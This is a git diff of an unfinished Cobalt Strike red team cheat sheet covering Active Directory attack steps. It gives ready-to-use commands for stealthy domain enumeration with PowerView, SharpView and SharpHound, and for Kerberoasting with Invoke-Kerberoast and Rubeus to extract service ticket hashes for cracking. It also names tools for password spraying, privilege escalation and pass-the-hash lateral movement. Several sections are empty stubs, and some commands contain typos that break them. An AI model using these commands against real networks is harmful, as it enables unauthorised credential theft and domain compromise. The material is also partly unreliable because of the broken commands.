@@ -1,10 +1,10 @@
 # NOTE: WORK IN PROGRESS
 
-# Cobalt Strike & Red Team Cheat Sheet
+# Cobalt Strike Red Team Cheat Sheet
 ---
-## Enumeration
+## Domain Enumeration
 
-### Running PowerView and SharpView
+Running PowerView and SharpView
 ```
 PowerView:
 # powershell-import --> Select PowerView.ps1 to import PS1 file in memory
@@ -15,13 +15,13 @@ SharpView
 # execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
 ```
 
-### Running ActiveDirectory module
+Running ActiveDirectory module
 ```
 # powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
 # powershell Get-ADDomainController -Domain test.lab.com
 ```
 
-### Running Sharphound (.NET version of Bloodhound) for AD domain collection
+Running Sharphound (.NET version of Bloodhound) for AD domain collection
 ```
 Running SharpView in memory (.NET version of PowerView)
 # execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain test.lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\
@@ -32,26 +32,52 @@ Collecting only user sessions to determine who is logged in and where:
 Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
 ```
 ---
-## Lateral Movement
+## Local Privilege Escalation
+PowerUp
 
 ---
-## Exfiltration
+## Lateral Movement
+RACE.ps1
+
+Invoke-TheHash
+
+Enable Powershell Remoting
+
+---
+## Domain Privilege Escalation
+### GPP Password
+
+### Password spraying
+(DomainPasswordSpray.ps1)[https://github.com/dafthack/DomainPasswordSpray]
+```
+
+```
 
 ### Kerberoasting
+PowerView kerberoasting
 ```
-PowerView kerberoasting:
-# powershell Get-DomainUesr -SPN --> Get users with SPN set
-# powershell Invoke-Kerberoast -Identity testaccount -Domain test.lab.com | fl
+Get users with SPN set
+# powershell Get-DomainUesr -SPN
 
-Requests service tickets for all kerberoast-able accounts and return ticket hashe
-# powershell Invoke-Kerberoast | fl
+Kerberoast all users
+# powershell Invoke-Kerberoast - OutputFormat hashcat | fl
 
-Rubeus kerberoasting:
-# execute-assembly C:\Rubeus.exe /outfile:KerbHashes.txt /user:testaccount /domain:test.lab.com
+Kerberoast specific user
+# powershell Invoke-Kerberoast -Identity testaccount -Domain test.lab.com -OutputFormat hashcat | fl
+```
+
+Rubeus kerberoasting
+```
+Kerberoast all users:
+# execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:test.lab.com
+
+Kerberoast specific user:
+# execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:test.lab.com
 ```
 
 ---
-## 
+## Exfiltration - Password Attacks
+
 
 ---
 # References
